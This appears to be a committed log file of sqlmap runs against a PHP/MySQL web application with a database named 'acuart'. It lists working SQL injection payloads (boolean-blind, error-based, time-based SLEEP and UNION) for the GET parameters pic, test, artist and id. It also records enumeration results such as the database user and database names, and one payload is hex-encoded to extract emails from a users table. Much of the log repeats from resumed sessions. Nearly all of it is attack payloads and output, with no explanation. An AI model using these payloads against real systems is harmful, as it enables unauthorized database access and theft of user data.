@@ -1,0 +1,265 @@
+sqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests:
+---
+Parameter: pic (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pic=5 AND 9160=9160
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: pic=5 AND GTID_SUBSET(CONCAT(0x71627a7871,(SELECT (ELT(9838=9838,1))),0x71786a7071),9838)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: pic=5 AND (SELECT 3013 FROM (SELECT(SLEEP(5)))taGB)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: pic=-1594 UNION ALL SELECT NULL,NULL,CONCAT(0x71627a7871,0x6d4a616e6c67776d50547562584d516d7574524e6f4b726e466c425a596d6c4978594d564b456d51,0x71786a7071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+current user: 'acuart@localhost'
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pic (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pic=5 AND 9160=9160
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: pic=5 AND GTID_SUBSET(CONCAT(0x71627a7871,(SELECT (ELT(9838=9838,1))),0x71786a7071),9838)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: pic=5 AND (SELECT 3013 FROM (SELECT(SLEEP(5)))taGB)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: pic=-1594 UNION ALL SELECT NULL,NULL,CONCAT(0x71627a7871,0x6d4a616e6c67776d50547562584d516d7574524e6f4b726e466c425a596d6c4978594d564b456d51,0x71786a7071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+sqlmap identified the following injection point(s) with a total of 96 HTTP(s) requests:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: test=query=' AND 3503=(SELECT (CASE WHEN (3503=3503) THEN 3503 ELSE (SELECT 3069 UNION SELECT 2312) END))-- -
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: test=query=' AND GTID_SUBSET(CONCAT(0x71706a6a71,(SELECT (ELT(9731=9731,1))),0x7170626b71),9731)-- KNdA
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query=' AND (SELECT 6153 FROM (SELECT(SLEEP(5)))lvzW)-- OOBz
+
+    Type: UNION query
+    Title: Generic UNION query (random number) - 3 columns
+    Payload: test=query=' UNION ALL SELECT 7207,CONCAT(0x71706a6a71,0x685a685251615a434862594a5743485058686b42436c694b6a6947717a7a4a71497649564e746759,0x7170626b71),7207-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.6
+current user: 'acuart@localhost'
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: test=query=' AND 3503=(SELECT (CASE WHEN (3503=3503) THEN 3503 ELSE (SELECT 3069 UNION SELECT 2312) END))-- -
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: test=query=' AND GTID_SUBSET(CONCAT(0x71706a6a71,(SELECT (ELT(9731=9731,1))),0x7170626b71),9731)-- KNdA
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query=' AND (SELECT 6153 FROM (SELECT(SLEEP(5)))lvzW)-- OOBz
+
+    Type: UNION query
+    Title: Generic UNION query (random number) - 3 columns
+    Payload: test=query=' UNION ALL SELECT 7207,CONCAT(0x71706a6a71,0x685a685251615a434862594a5743485058686b42436c694b6a6947717a7a4a71497649564e746759,0x7170626b71),7207-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.6
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+sqlmap identified the following injection point(s) with a total of 168 HTTP(s) requests:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: artist=(SELECT (CASE WHEN (9766=9766) THEN 0x2d3120756e696f6e2073656c65637420312c67726f75705f636f6e63617428656d61696c292c332066726f6d207573657273 ELSE (SELECT 9565 UNION SELECT 7369) END))
+
+    Type: error-based
+    Title: MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)
+    Payload: artist=GTID_SUBSET(CONCAT(0x71706a6b71,(SELECT (ELT(3031=3031,1))),0x71786b7171),3031)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+    Payload: artist=(CASE WHEN (4246=4246) THEN SLEEP(5) ELSE 4246 END)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-2385 UNION ALL SELECT CONCAT(0x71706a6b71,0x5752596a48686559744b585a55796562625a53526e53504c76517a5153554c484f6f697776704552,0x71786b7171),NULL,NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.6
+current user: 'acuart@localhost'
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: artist=(SELECT (CASE WHEN (9766=9766) THEN 0x2d3120756e696f6e2073656c65637420312c67726f75705f636f6e63617428656d61696c292c332066726f6d207573657273 ELSE (SELECT 9565 UNION SELECT 7369) END))
+
+    Type: error-based
+    Title: MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)
+    Payload: artist=GTID_SUBSET(CONCAT(0x71706a6b71,(SELECT (ELT(3031=3031,1))),0x71786b7171),3031)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+    Payload: artist=(CASE WHEN (4246=4246) THEN SLEEP(5) ELSE 4246 END)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-2385 UNION ALL SELECT CONCAT(0x71706a6b71,0x5752596a48686559744b585a55796562625a53526e53504c76517a5153554c484f6f697776704552,0x71786b7171),NULL,NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+sqlmap identified the following injection point(s) with a total of 304 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: id=-1056 OR 4787=4787#
+
+    Type: error-based
+    Title: MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)
+    Payload: id=GTID_SUBSET(CONCAT(0x717a6a7871,(SELECT (ELT(1272=1272,1))),0x717a626271),1272)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+    Payload: id=(CASE WHEN (9725=9725) THEN SLEEP(5) ELSE 9725 END)
+
+    Type: UNION query
+    Title: Generic UNION query (random number) - 3 columns
+    Payload: id=-9815 UNION ALL SELECT 3466,3466,CONCAT(0x717a6a7871,0x4d6f774371416a684349617a736f507a617457637978544d77547a474e476c654e6b59586d4d4c50,0x717a626271)-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+current user: 'acuart@localhost'
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: id=-1056 OR 4787=4787#
+
+    Type: error-based
+    Title: MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)
+    Payload: id=GTID_SUBSET(CONCAT(0x717a6a7871,(SELECT (ELT(1272=1272,1))),0x717a626271),1272)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+    Payload: id=(CASE WHEN (9725=9725) THEN SLEEP(5) ELSE 9725 END)
+
+    Type: UNION query
+    Title: Generic UNION query (random number) - 3 columns
+    Payload: id=-9815 UNION ALL SELECT 3466,3466,CONCAT(0x717a6a7871,0x4d6f774371416a684349617a736f507a617457637978544d77547a474e476c654e6b59586d4d4c50,0x717a626271)-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: artist=(SELECT (CASE WHEN (9766=9766) THEN 0x2d3120756e696f6e2073656c65637420312c67726f75705f636f6e63617428656d61696c292c332066726f6d207573657273 ELSE (SELECT 9565 UNION SELECT 7369) END))
+
+    Type: error-based
+    Title: MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)
+    Payload: artist=GTID_SUBSET(CONCAT(0x71706a6b71,(SELECT (ELT(3031=3031,1))),0x71786b7171),3031)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+    Payload: artist=(CASE WHEN (4246=4246) THEN SLEEP(5) ELSE 4246 END)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-2385 UNION ALL SELECT CONCAT(0x71706a6b71,0x5752596a48686559744b585a55796562625a53526e53504c76517a5153554c484f6f697776704552,0x71786b7171),NULL,NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+current user: 'acuart@localhost'
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: artist=(SELECT (CASE WHEN (9766=9766) THEN 0x2d3120756e696f6e2073656c65637420312c67726f75705f636f6e63617428656d61696c292c332066726f6d207573657273 ELSE (SELECT 9565 UNION SELECT 7369) END))
+
+    Type: error-based
+    Title: MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)
+    Payload: artist=GTID_SUBSET(CONCAT(0x71706a6b71,(SELECT (ELT(3031=3031,1))),0x71786b7171),3031)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+    Payload: artist=(CASE WHEN (4246=4246) THEN SLEEP(5) ELSE 4246 END)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-2385 UNION ALL SELECT CONCAT(0x71706a6b71,0x5752596a48686559744b585a55796562625a53526e53504c76517a5153554c484f6f697776704552,0x71786b7171),NULL,NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+available databases [2]:
+[*] acuart
+[*] information_schema
+
